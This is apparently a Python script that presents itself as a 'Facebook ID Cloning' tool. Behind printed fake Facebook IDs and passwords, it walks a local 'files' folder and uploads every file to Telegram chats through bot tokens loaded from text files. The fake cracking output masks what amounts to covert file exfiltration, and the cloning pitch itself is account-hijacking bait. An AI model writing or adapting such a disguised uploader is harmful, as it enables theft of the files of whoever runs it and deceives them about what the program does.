import os
import time
import requests
import random

# Show Banner
os.system("clear")
print("""
   ______             _               _ 
  |  ____|           | |             | |
  | |__ _ __ ___  ___| |__   ___  ___| |
  |  __| '__/ _ \/ __| '_ \ / _ \/ __| |
  | |  | | | (_) \__ \ | | |  __/ (__| |
  |_|  |_|  \___/|___/_| |_|\___|\___|_|

        Method 1: Facebook ID Cloning
              Tool Owner: Forhad
""")

# Load bot tokens
with open("tokens.txt", "r") as f:
    bot_tokens = [line.strip() for line in f if line.strip()]

# Load chat IDs (e.g., channel IDs)
with open("chat_ids.txt", "r") as f:
    chat_ids = [line.strip() for line in f if line.strip()]

# List all files in the "files/" directory
files_to_send = []
for root, dirs, files in os.walk("files"):
    for file in files:
        full_path = os.path.join(root, file)
        files_to_send.append(full_path)

# Fake Facebook ID & password generator
def fake_fb_info():
    ids = ["10009" + str(random.randint(1000000000, 9999999999)) for _ in range(10)]
    passwords = ["@123456", "@2025fb", "@password1", "@freefire", "@bd786", "@iloveyou", "@admin123", "@forhad"]
    return random.choice(ids), random.choice(passwords)

# Send files using round-robin across bots
bot_index = 0
for file_path in files_to_send:
    token = bot_tokens[bot_index % len(bot_tokens)]
    for chat_id in chat_ids:
        try:
            url = f"https://api.telegram.org/bot{token}/sendDocument"
            with open(file_path, "rb") as file_data:
                fake_id, fake_pass = fake_fb_info()
                print(f"[FACEBOOK] ID: {fake_id} | PASS: {fake_pass}")
                resp = requests.post(url, data={"chat_id": chat_id}, files={"document": file_data})
                if resp.status_code == 200:
                    print("[✓] File Sent\n")
                else:
                    print("[-] Failed:", resp.text)
        except Exception as e:
            print(f"[!] Error sending {file_path}: {e}")
    bot_index += 1
    time.sleep(0.1)
